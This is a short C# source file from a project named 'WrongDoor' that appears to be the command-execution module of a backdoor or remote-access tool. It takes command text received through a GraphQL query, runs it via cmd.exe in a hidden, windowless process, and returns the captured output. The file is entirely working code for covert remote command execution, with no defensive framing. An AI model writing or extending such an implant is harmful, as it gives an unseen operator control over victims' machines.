using System.Diagnostics;
using System.Threading.Tasks;
using WrongDoor.Connector;

namespace WrongDoor.MainServer.CommandExutors
{
    public class CommandLineExecutor : BaseExecutor
    {
        public async Task<string> Execute(GetCommandsGQL.Response.CommandSelection command)
        {
            var processOptions = new ProcessStartInfo(@"cmd.exe", @"/C " + command.body)
            {
                WindowStyle = ProcessWindowStyle.Hidden,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            var process = Process.Start(processOptions);

            var outp = process.StandardError.ReadToEnd();
            outp += process.StandardOutput.ReadToEnd();

            process.WaitForExit();

            return (outp);
        }
    }
}
